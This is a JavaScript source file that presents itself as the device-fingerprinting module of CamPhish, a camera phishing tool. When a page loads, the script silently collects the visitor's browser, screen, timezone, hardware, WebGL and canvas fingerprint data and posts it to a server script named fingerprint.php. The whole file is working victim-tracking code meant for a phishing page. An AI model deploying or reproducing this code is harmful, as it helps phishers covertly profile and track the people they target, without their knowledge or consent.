/**
 * CamPhish - Advanced Camera Phishing Tool
 * Device Fingerprinting Module
 * 
 * @author     Rahul Kushwaha
 * @github     https://github.com/raahulllkushwaha
 * @repository https://github.com/raahulllkushwaha/Cam-Phisher
 * @license    GNU General Public License v3.0
 */

(function() {
    'use strict';

    /**
     * Collects device fingerprint information
     * @returns {Object} Device fingerprint data
     */
    function collectFingerprint() {
        var fingerprint = {};

        // Basic browser information
        fingerprint.userAgent = navigator.userAgent || 'Unknown';
        fingerprint.language = navigator.language || navigator.userLanguage || 'Unknown';
        fingerprint.platform = navigator.platform || 'Unknown';

        // Screen information
        fingerprint.screenWidth = screen.width || 0;
        fingerprint.screenHeight = screen.height || 0;
        fingerprint.colorDepth = screen.colorDepth || 0;
        fingerprint.pixelRatio = window.devicePixelRatio || 1;

        // Timezone information
        try {
            var dateTimeFormat = Intl.DateTimeFormat();
            var resolvedOptions = dateTimeFormat.resolvedOptions();
            fingerprint.timezone = (resolvedOptions && resolvedOptions.timeZone) ? resolvedOptions.timeZone : 'Unknown';
        } catch (e) {
            fingerprint.timezone = 'Unknown';
        }
        fingerprint.timezoneOffset = new Date().getTimezoneOffset();

        // Hardware information
        fingerprint.hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
        fingerprint.deviceMemory = navigator.deviceMemory || 'Unknown';

        // WebGL information
        var webglInfo = getWebGLInfo();
        fingerprint.webglVendor = webglInfo.vendor;
        fingerprint.webglRenderer = webglInfo.renderer;

        // Canvas fingerprint
        fingerprint.canvasFingerprint = getCanvasFingerprint();

        // Browser features
        fingerprint.cookiesEnabled = navigator.cookieEnabled || false;
        fingerprint.doNotTrack = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || 'Unknown';
        fingerprint.touchSupport = getTouchSupport();

        return fingerprint;
    }

    /**
     * Gets WebGL vendor and renderer information
     * @returns {Object} WebGL info with vendor and renderer
     */
    function getWebGLInfo() {
        var info = {
            vendor: 'Unknown',
            renderer: 'Unknown'
        };

        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (gl) {
                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    info.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Unknown';
                    info.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
                }
            }
        } catch (e) {
            // WebGL not supported or error occurred
        }

        return info;
    }

    /**
     * Generates canvas fingerprint by drawing text and getting dataURL
     * @returns {string} Canvas fingerprint hash
     */
    function getCanvasFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            var ctx = canvas.getContext('2d');

            // Draw background
            ctx.fillStyle = '#f0f0f0';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            // Draw text with various styles
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#123456';
            ctx.fillText('Fingerprint Test 🎭', 2, 2);

            ctx.font = '18px Georgia';
            ctx.fillStyle = '#654321';
            ctx.fillText('Canvas FP', 4, 20);

            // Add some shapes
            ctx.beginPath();
            ctx.arc(150, 25, 15, 0, Math.PI * 2);
            ctx.fillStyle = '#789abc';
            ctx.fill();

            return canvas.toDataURL();
        } catch (e) {
            return 'Error';
        }
    }

    /**
     * Detects touch support capabilities
     * @returns {Object} Touch support information
     */
    function getTouchSupport() {
        var maxTouchPoints = 0;
        var touchEvent = false;
        var touchStart = false;

        try {
            if (typeof navigator.maxTouchPoints !== 'undefined') {
                maxTouchPoints = navigator.maxTouchPoints;
            } else if (typeof navigator.msMaxTouchPoints !== 'undefined') {
                maxTouchPoints = navigator.msMaxTouchPoints;
            }

            touchEvent = 'ontouchstart' in window;
            touchStart = 'TouchEvent' in window;
        } catch (e) {
            // Error detecting touch support
        }

        return {
            maxTouchPoints: maxTouchPoints,
            touchEvent: touchEvent,
            touchStart: touchStart
        };
    }

    /**
     * Sends fingerprint data to the server
     * @param {Object} data - Fingerprint data to send
     */
    function sendFingerprint(data) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'fingerprint.php', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                // Fingerprint data sent
            }
        };

        xhr.onerror = function() {
            // Error sending fingerprint
        };

        xhr.send(JSON.stringify(data));
    }

    /**
     * Main function to collect and send fingerprint
     */
    function init() {
        var fingerprint = collectFingerprint();
        sendFingerprint(fingerprint);
    }

    // Auto-run on page load
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
